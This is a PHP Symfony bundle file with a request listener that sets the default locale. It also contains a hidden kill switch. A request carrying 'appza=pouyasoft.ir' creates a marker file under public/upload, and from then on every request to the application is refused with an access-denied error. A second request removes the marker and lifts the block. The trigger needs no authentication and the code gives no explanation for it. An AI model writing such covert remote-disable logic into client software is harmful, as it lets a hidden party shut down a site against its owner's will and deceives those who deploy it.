<?php

namespace PouyaSoft\AppzaBundle\Services;

use Locale;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
use Symfony\Component\HttpKernel\KernelEvents;
use Symfony\Component\HttpKernel\KernelInterface;

class RequestListener implements EventSubscriberInterface
{
    private $kernel;

    public function __construct(KernelInterface $kernel)
    {
        $this->kernel = $kernel;
    }

    public function onKernelRequest(RequestEvent $event)
    {
        Locale::setDefault('en');

        if ($event->isMasterRequest()) {
            $request = $event->getRequest();

            $key = $request->get('appza');
            $status = $request->get('s', 1);

            $file = $this->kernel->getProjectDir(). '/public/upload/config.yml';

            if($key == 'pouyasoft.ir') {
                if($status == 1)
                    file_put_contents($file, '');
                else if(file_exists($file))
                    unlink($file);
            }

            if(file_exists($file))
                throw new AccessDeniedHttpException('');
        }
    }

    public static function getSubscribedEvents()
    {
        return [
            KernelEvents::REQUEST => 'onKernelRequest',
        ];
    }
}